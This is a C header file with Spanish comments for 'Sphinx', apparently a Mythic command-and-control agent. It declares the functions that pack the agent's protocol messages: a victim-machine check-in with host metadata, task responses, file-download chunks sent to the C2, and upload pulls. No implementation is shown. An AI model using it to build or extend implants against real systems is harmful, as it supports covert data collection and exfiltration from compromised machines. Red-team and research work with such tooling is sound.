#ifndef SPHINX_PACKER_H
#define SPHINX_PACKER_H
#include <stdint.h>
#include "protocol.h"

/*Escribe 1 byte en la posición *offset del buffer e incrementa el offset.*/
void pack_byte(uint8_t* buf, size_t* offset, uint8_t value);

/*Escribe 4 bytes en formato Big-Endian (Network Byte Order) e incrementa el offset.*/
void pack_u32(uint8_t* buf, size_t* offset, uint32_t value);

/*Empaqueta la longitud (4B) seguida de los datos en bruto.*/
void pack_bytes(uint8_t* buf, size_t* offset, const uint8_t* data, size_t len);

/*Wrapper de pack_bytes para cadenas de texto basadas en caracteres (C-strings).*/
void pack_string(uint8_t* buf, size_t* offset, const char* str);

/*Construye un bloque TLV completo de respuesta para una tarea específica.*/
void pack_task_response(uint8_t* buf, size_t* offset, const char* task_uuid, const uint8_t* output, size_t output_len,
                        uint8_t status);

/*Inicia el mensaje exterior indicando cuántas tareas se van a reportar.*/
void pack_post_response_start(uint8_t* buf, size_t* offset, uint32_t num_tasks);

/*Recopila toda la metadata de la máquina víctima y genera el buffer de checkin inicial.*/
void pack_checkin(uint8_t* buf, size_t* offset, const char* temp_uuid);

/*Inicia el mensaje de comienzo de descarga, recibirá el uuid de la descarga del c2*/
void pack_download_init(uint8_t* buf, size_t* off, const char* task_uuid, uint32_t total_chunks, const char* full_path, uint32_t chunk_size);

/*Continua con la informacion de la descarga*/
void pack_download_cont(uint8_t* buf, size_t* off, const char* task_uuid, uint32_t chunk_num, const char* file_id,
                        const uint8_t* data, uint32_t len_data, uint32_t chunk_size);

/* 0x04 pull de chunk de upload (agente pide chunk a Mythic):
   [0x04][36B task_uuid][4B chunk_num][36B file_id][4B len+full_path][4B chunk_size] */
void pack_upload_pull(uint8_t* buf, size_t* off, const char* task_uuid, uint32_t chunk_num, const char* file_id,
                      const char* full_path, uint32_t chunk_size);

#endif //SPHINX_PACKER_H
